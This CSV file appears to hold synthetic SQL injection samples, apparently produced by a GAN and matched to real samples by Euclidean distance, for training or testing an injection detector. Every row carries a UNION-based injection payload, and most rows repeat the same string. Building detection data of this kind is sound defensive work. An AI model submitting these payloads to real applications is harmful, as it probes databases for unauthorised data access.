id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
GAN_000105,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.694032393949254
GAN_000106,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.7078908914983253
GAN_000107,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.580901375742398
GAN_000108,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.5274220152503686
GAN_000109,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.788619689480972
GAN_000110,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.4949834019592334
GAN_000111,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.622794802037625
GAN_000112,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.677538157740111
GAN_000113,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.5989923337476317
GAN_000114,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.6209495254030357
GAN_000115,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.5453436752587897
GAN_000116,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.5806574470148846
GAN_000117,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.6731887958450518
GAN_000118,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.8174645842621793
GAN_000119,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.747454352646907
GAN_000120,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.613285081528861
GAN_000121,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.6845205747420873
GAN_000122,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.4628720858923696
GAN_000123,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.5912781110034016
GAN_000124,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.77262058728579
GAN_000125,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,3.8082949949960274
GAN_000126,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.568108345383484
GAN_000127,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.591721941022229
GAN_000128,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.6618548791525467
GAN_000129,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.5390962367762167
GAN_000130,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.5399781348561112
GAN_000131,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.500622590469884
GAN_000132,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.6953991567106352
GAN_000133,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.697907443200596
GAN_000134,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.4388927932752655
GAN_000135,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.794674046591375
GAN_000136,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.793907585074028
GAN_000137,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.744380131573929
GAN_000138,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.571487370990304
GAN_000139,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.412500865105928
GAN_000140,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,3.944987132843368
GAN_000141,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.746384515064569
GAN_000142,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.545615681056447
GAN_000143,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.596894701945525
GAN_000144,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.5217071432161027
GAN_000145,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.645858432828319
GAN_000146,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.7019710320341526
GAN_000147,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.6558555833423783
GAN_000148,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.6073082768448446
GAN_000149,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.6084702350094164
GAN_000150,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,3.7802149378264476
GAN_000151,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.629631876555386
GAN_000152,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.530945499455098
GAN_000153,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.556176245792856
GAN_000154,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.425112259521973
GAN_000155,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.6934194936065157
GAN_000156,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.4408680588395293
GAN_000157,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.6350203800617695
GAN_000158,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.700390820530813
GAN_000159,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.508367196298422
GAN_000160,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.5864805902758903
GAN_000161,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.5577517112436636
GAN_000162,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,3.7463594771610396
GAN_000163,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.595827548451317
GAN_000164,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.5913173484037015
GAN_000165,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.5207703831208326
GAN_000166,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.6628187345324186
GAN_000167,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.6383696648794563
GAN_000168,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.8854259965959987
GAN_000169,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.5787811911430274
GAN_000170,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.5749988158706616
GAN_000171,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,3.761499454253445
GAN_000172,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,3.7949793548548096
GAN_000173,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,3.6991373474521496
GAN_000174,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.526281302893359
GAN_000175,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.7071247806339342
GAN_000176,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.592695585700872
GAN_000177,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.926177910295219
GAN_000178,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.526916081295759
GAN_000179,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.6958029705826747
GAN_000180,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.628029472620649
GAN_000181,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.628842393214426
GAN_000182,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.7710830454018307
GAN_000183,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.6791276311361436
GAN_000184,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,3.6461791606677405
GAN_000185,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.645887586935098
GAN_000186,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.8600224264289795
GAN_000187,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.527161511513184
GAN_000188,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,3.7897974195384623
GAN_000189,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.623014109746904
GAN_000190,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.591578911365274
GAN_000191,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.6303520473228805
GAN_000192,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.6071072669866617
GAN_000193,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.5919413085996994
GAN_000194,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,3.736599864897185
GAN_000195,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.628519901238786
GAN_000196,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,3.726999348747522
GAN_000197,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.660346428661591
GAN_000198,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,3.6496568948213493
